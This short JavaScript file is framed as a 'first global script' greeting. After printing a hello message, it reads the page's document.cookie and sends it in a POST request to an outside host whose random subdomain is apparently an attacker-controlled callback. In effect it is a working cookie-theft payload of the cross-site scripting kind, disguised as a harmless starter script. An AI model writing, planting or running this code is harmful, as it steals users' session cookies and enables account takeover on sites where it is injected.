console.log('Hello from your first global script!');
alert('Hellow from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
  method: "POST",
  body: data,
  headers: {
    "Content-type": "application/json; charset=UTF-8"
  }
})
  .then((response) => response.json())
  .then((json) => console.log(json));